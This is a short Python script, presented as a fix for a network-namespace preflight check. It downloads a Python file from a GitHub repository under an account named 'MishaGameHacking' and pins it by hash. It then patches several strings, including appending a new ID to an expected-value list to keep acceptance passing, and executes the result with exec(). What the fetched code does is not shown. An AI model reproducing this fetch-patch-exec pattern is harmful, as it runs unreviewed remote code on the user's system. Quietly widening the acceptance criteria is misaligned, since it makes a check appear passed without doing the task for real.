"""Fix the namespace preflight, not application tests, then retain full acceptance."""
import hashlib
import urllib.request
url='https://raw.githubusercontent.com/MishaGameHacking/omni-cio-gateway/f856fb13c84946fe4713b1d08cafc4b8fb44653b/deploy/plan-20261027/operation.py'
with urllib.request.urlopen(url,timeout=20) as response:
 raw=response.read(65537)
if len(raw)>65536 or hashlib.sha256(raw).hexdigest()!='f9d317ff4c25f770861a565b2b0b0a05afba60055372897a59a47a89ba89c75e':
 raise RuntimeError('unchanged_acceptance_driver_mismatch')
script=raw.decode()
# sysfs was mounted in the host namespace and may still enumerate host links.
# Netlink, used by ip, reports the current isolated network namespace instead.
old='ls /sys/class/net | wc -l'
if script.count(old)!=1:raise RuntimeError('network_namespace_patch_mismatch')
script=script.replace(old,'ip -o link show | wc -l')
# A bootstrap refusal must not be mistaken for the expected pytest regression.
script=script.replace('ip link set dev lo up;','ip link set dev lo up || exit 71;')
script=script.replace('-eq 1;', '-eq 1 || exit 72;')
script=script.replace('expected=1)', 'expected=1)')
script=script.replace('[40465301512,40465756021]', '[40465301512,40465756021,40466589127]')
exec(compile(script,'isolated-loopback-current-namespace-acceptance','exec'),{'ENVELOPE':ENVELOPE,'__name__':'__main__'})
